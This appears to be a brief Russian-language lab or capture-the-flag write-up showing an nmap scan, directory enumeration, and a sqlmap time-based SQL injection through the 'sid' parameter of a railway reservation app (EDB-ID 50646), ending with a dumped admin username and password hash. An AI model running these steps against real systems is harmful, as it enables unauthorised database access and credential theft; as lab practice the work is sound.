<img width="1733" height="1123" alt="{4FF41707-3D39-4A2A-A59C-8365C476DFB0}" src="https://github.com/user-attachments/assets/4a55d789-bef5-44bb-9431-0a1c0895fcfb" />



```
┌──(lsd㉿lsd)-[~]
└─$ nmap -T5 -p- 10.114.137.31                 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-12 17:13 EST
Warning: 10.114.137.31 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.114.137.31
Host is up (0.066s latency).
Not shown: 65306 closed tcp ports (reset), 224 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
873/tcp  open  rsync
8820/tcp open  unknown
9020/tcp open  tambora


┌──(lsd㉿lsd)-[~]
└─$ dirsearch -u http://10.114.137.31:873/ -w /home/lsd/Desktop/ffuf/DirBuster-2007_directory-list-2.3-big.txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )                                                                                                                                                       
                                                                                                                                                                              
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 1273784

Output File: /home/lsd/reports/http_10.114.137.31_873/__26-11-12_17-59-54.txt

Target: http://10.114.137.31:873/
[17:59:54] Starting:                                                                                                                                                          
[18:01:08] 301 -  318B  - /rail  ->  http://10.114.137.31:873/rail/ 
```

## EDB-ID: 50646

http://10.114.137.31:873/rail/?page=reserve&sid=1 уязвимый параметр sid
<img width="1792" height="596" alt="{7E52414F-B2E4-4D87-82C8-836AA0C5E26D}" src="https://github.com/user-attachments/assets/5b85a9d6-6d6c-4624-b608-5f85b62c78d8" />

у нас есть orrs дбшка, посмотрим что там за таблицы

```
[18:08:56] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:08:56] [INFO] fetching tables for database: 'orrs'
[18:08:56] [INFO] fetching number of tables for database 'orrs'
[18:08:56] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                  
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[18:09:04] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[18:09:14] [INFO] adjusting time delay to 1 second due to good response times
6
[18:09:16] [INFO] retrieved: schedule_list
[18:09:51] [INFO] retrieved: system_info
[18:10:22] [INFO] retrieved: reservation_list
[18:11:02] [INFO] retrieved: message_list
[18:11:32] [INFO] retrieved: users
[18:11:51] [INFO] retrieved: trai^C
```

смотрим что в users - 

+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | 5765dcb76627ba4e2fd673e073def4ae |
+----------+----------------------------------+


